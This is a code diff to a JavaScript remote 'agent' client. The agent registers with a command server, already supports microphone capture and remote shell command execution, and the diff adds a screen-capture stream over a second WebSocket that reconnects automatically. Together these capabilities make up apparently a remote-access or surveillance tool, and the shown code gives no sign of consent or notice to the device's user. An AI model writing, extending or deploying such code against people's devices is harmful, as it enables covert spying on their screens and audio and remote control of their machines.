@@ -3,12 +3,43 @@ import { getAgentId } from "./identity.js";
 import { getDeviceInfo } from "./device.js";
 import { startMicrophone, stopMicrophone } from "./microphone.js";
 import { startShell, executeCommand, stopShell } from "./command.js";
+import { startScreenCapture, stopScreenCapture } from "./screen.js";
 import config from "./config.js";
 const SERVER_URL = config.server;
 // const SERVER_URL = "ws://localhost:3000/agent";
 let socket = null;
+let screenSocket = null;
 let reconnectDelay = 2000;
 const agentId = getAgentId();
+function connectScreenSocket() {
+    const screenUrl = SERVER_URL.replace("/agent", "/screen-agent");
+    console.log("Connecting to screen server...");
+    screenSocket =
+        new WebSocket(screenUrl);
+    screenSocket.on("open", () => {
+        console.log("Screen WebSocket connected");
+        screenSocket?.send(JSON.stringify({
+            type: "screen_register",
+            agentId
+        }));
+        console.log("Screen agent registered");
+    });
+    screenSocket.on("close", () => {
+        console.log("Screen WebSocket closed");
+        screenSocket = null;
+        // Reconnect screen socket if the main agent
+        // is still connected.
+        if (socket &&
+            socket.readyState === WebSocket.OPEN) {
+            setTimeout(() => {
+                connectScreenSocket();
+            }, 2000);
+        }
+    });
+    screenSocket.on("error", (error) => {
+        console.error("Screen WebSocket error:", error);
+    });
+}
 async function handleCommand(message) {
     switch (message.type) {
         case "microphone_start":
@@ -34,6 +65,29 @@ async function handleCommand(message) {
             catch (error) {
                 console.error("Command execution failed:", error);
             }
+            break;
+        }
+        case "screen_start": {
+            const fps = typeof message.fps === "number"
+                ? message.fps
+                : 5;
+            startScreenCapture((frame) => {
+                if (screenSocket &&
+                    screenSocket.readyState === WebSocket.OPEN) {
+                    screenSocket.send(frame);
+                }
+            }, fps);
+            socket?.send(JSON.stringify({
+                type: "screen_started",
+                fps
+            }));
+            break;
+        }
+        case "screen_stop": {
+            stopScreenCapture();
+            socket?.send(JSON.stringify({
+                type: "screen_stopped"
+            }));
             break;
         }
     }
@@ -63,6 +117,7 @@ export function connect() {
         });
         console.log("Sending registration:", registrationMessage);
         socket?.send(JSON.stringify(registrationMessage));
+        connectScreenSocket();
     });
     socket.on("message", (data, isBinary) => {
         // console.log(
